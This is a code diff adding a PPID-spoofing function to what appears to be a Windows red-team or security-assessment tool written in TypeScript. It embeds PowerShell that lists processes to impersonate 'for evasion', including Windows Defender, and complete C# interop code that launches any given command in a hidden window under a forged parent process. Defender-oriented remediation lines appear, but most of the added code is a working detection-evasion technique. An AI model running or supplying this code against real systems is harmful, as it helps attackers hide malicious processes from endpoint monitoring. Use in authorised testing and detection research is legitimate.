@@ -1792,6 +1792,191 @@ export async function stealthCheck(args: string[], timeout: number): Promise<Hoo
   return { output: output.join("\n"), findings }
 }
 
+export async function ppidSpoof(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const parent = argVal(args, "--parent")
+  const command = argVal(args, "--command")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Parent PID spoofing...\n"]
+
+  if (action === "enum") {
+    const script = `
+Write-Output "=== Spoofable Parent Processes ==="
+$ErrorActionPreference = 'SilentlyContinue'
+
+$candidates = @(
+    @{ Name = 'explorer'; Desc = 'Windows Explorer — most natural parent for user processes' },
+    @{ Name = 'svchost'; Desc = 'Service Host — blends with system services' },
+    @{ Name = 'RuntimeBroker'; Desc = 'Runtime Broker — UWP app parent' },
+    @{ Name = 'sihost'; Desc = 'Shell Infrastructure Host — system UI' },
+    @{ Name = 'taskhostw'; Desc = 'Task Host — scheduled task runner' },
+    @{ Name = 'userinit'; Desc = 'Userinit — logon process' },
+    @{ Name = 'winlogon'; Desc = 'Winlogon — authentication parent (SYSTEM context)' },
+    @{ Name = 'services'; Desc = 'Service Control Manager — SYSTEM service parent' },
+    @{ Name = 'lsass'; Desc = 'LSASS — authentication (SYSTEM, PPL protected)' },
+    @{ Name = 'wininit'; Desc = 'Windows Init — session 0 system parent' },
+    @{ Name = 'csrss'; Desc = 'Client Server Runtime — critical system (Protected)' },
+    @{ Name = 'MsMpEng'; Desc = 'Windows Defender — ironic but effective cover' }
+)
+
+Write-Output "[*] Running candidate parent processes:"
+Write-Output ""
+foreach ($c in $candidates) {
+    $procs = Get-Process -Name $c.Name -ErrorAction SilentlyContinue
+    if ($procs) {
+        foreach ($p in $procs) {
+            $session = $p.SessionId
+            $context = if ($session -eq 0) { 'SESSION-0 (SYSTEM)' } else { "SESSION-$session (User)" }
+            Write-Output "    [PID $($p.Id)] $($p.ProcessName) — $($c.Desc)"
+            Write-Output "         $context  Path: $($p.Path)"
+        }
+    }
+}
+
+Write-Output ""
+Write-Output "=== Current Process Tree ==="
+$current = Get-Process -Id $PID
+$parentId = (Get-WmiObject Win32_Process -Filter "ProcessId=$PID").ParentProcessId
+$parentProc = Get-Process -Id $parentId -ErrorAction SilentlyContinue
+Write-Output "[*] Current: $($current.ProcessName) (PID $PID)"
+Write-Output "[*] Parent:  $($parentProc.ProcessName) (PID $parentId)"
+Write-Output ""
+Write-Output "[*] Recommended parents for evasion:"
+Write-Output "    User context: explorer.exe (PID from Session > 0)"
+Write-Output "    SYSTEM context: svchost.exe (PID from Session 0)"
+Write-Output "    Service context: services.exe"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-EVASION-012",
+      provider: "windows",
+      severity: "info",
+      status: "ENUMERATED",
+      resource: "process://ppid-candidates",
+      title: "Spoofable parent process enumeration for PPID spoofing",
+      details: r.stdout.substring(0, 500),
+      remediation: "Monitor for process creation with unusual parent-child relationships. Use ETW for PROC_THREAD_ATTRIBUTE detection.",
+    })
+  }
+
+  if (action === "spoof") {
+    if (!command) {
+      output.push("[!] --command required for spoof action")
+      return { output: output.join("\n"), findings }
+    }
+    const parentTarget = parent || "explorer"
+    const script = `
+Write-Output "=== PPID Spoofing — Creating Process with Fake Parent ==="
+
+Add-Type @'
+using System;
+using System.Runtime.InteropServices;
+
+public class PpidSpoof {
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern bool CreateProcessA(string app, string cmdLine, IntPtr procSec, IntPtr threadSec, bool inherit, uint flags, IntPtr env, string dir, ref STARTUPINFOEX si, out PROCESS_INFORMATION pi);
+    [DllImport("kernel32.dll")]
+    static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
+    [DllImport("kernel32.dll")]
+    static extern bool CloseHandle(IntPtr h);
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct STARTUPINFOEX {
+        public STARTUPINFO StartupInfo;
+        public IntPtr lpAttributeList;
+    }
+
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
+    public struct STARTUPINFO {
+        public int cb;
+        public string lpReserved, lpDesktop, lpTitle;
+        public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
+        public short wShowWindow, cbReserved2;
+        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct PROCESS_INFORMATION {
+        public IntPtr hProcess, hThread;
+        public int dwProcessId, dwThreadId;
+    }
+
+    public static string Spoof(int parentPid, string command) {
+        IntPtr parentHandle = OpenProcess(0x0080, false, parentPid);
+        if (parentHandle == IntPtr.Zero) return $"[-] Cannot open parent PID {parentPid} — need SeDebugPrivilege or same-user process";
+
+        IntPtr size = IntPtr.Zero;
+        InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref size);
+        IntPtr attrList = Marshal.AllocHGlobal(size);
+        InitializeProcThreadAttributeList(attrList, 1, 0, ref size);
+
+        IntPtr parentVal = Marshal.AllocHGlobal(IntPtr.Size);
+        Marshal.WriteIntPtr(parentVal, parentHandle);
+
+        IntPtr PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = (IntPtr)0x00020000;
+        UpdateProcThreadAttribute(attrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, parentVal, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
+
+        var si = new STARTUPINFOEX();
+        si.StartupInfo.cb = Marshal.SizeOf(si);
+        si.lpAttributeList = attrList;
+
+        PROCESS_INFORMATION pi;
+        uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
+        uint CREATE_NO_WINDOW = 0x08000000;
+
+        bool ok = CreateProcessA(null, command, IntPtr.Zero, IntPtr.Zero, false, EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, IntPtr.Zero, null, ref si, out pi);
+
+        Marshal.FreeHGlobal(parentVal);
+        Marshal.FreeHGlobal(attrList);
+        CloseHandle(parentHandle);
+
+        if (ok) {
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+            return $"[+] Process created with spoofed parent\\n    Child PID: {pi.dwProcessId}\\n    Fake Parent PID: {parentPid}\\n    Command: {command}";
+        }
+        return $"[-] CreateProcess failed — error: {Marshal.GetLastWin32Error()}";
+    }
+}
+'@
+
+$parentProc = Get-Process -Name "${parentTarget}" -ErrorAction SilentlyContinue | Select-Object -First 1
+if (-not $parentProc) {
+    Write-Output "[-] Parent process '${parentTarget}' not found"
+    exit 1
+}
+
+Write-Output "[*] Parent: $($parentProc.ProcessName) (PID $($parentProc.Id))"
+Write-Output "[*] Command: ${command}"
+Write-Output ""
+
+$result = [PpidSpoof]::Spoof($parentProc.Id, "${command}")
+Write-Output $result
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-EVASION-013",
+      provider: "windows",
+      severity: "high",
+      status: r.stdout.includes("[+] Process created") ? "EXECUTED" : "FAILED",
+      resource: `process://ppid-spoof/${parentTarget}`,
+      title: `PPID spoofing — process created under fake parent ${parentTarget}`,
+      details: r.stdout.substring(0, 500),
+      remediation: "Monitor for PROC_THREAD_ATTRIBUTE_PARENT_PROCESS usage. Validate parent-child process relationships.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 export async function unhookNtdll(args: string[], timeout: number): Promise<HookResult> {
   const action = argVal(args, "--action") || "check"
   const findings: Finding[] = []
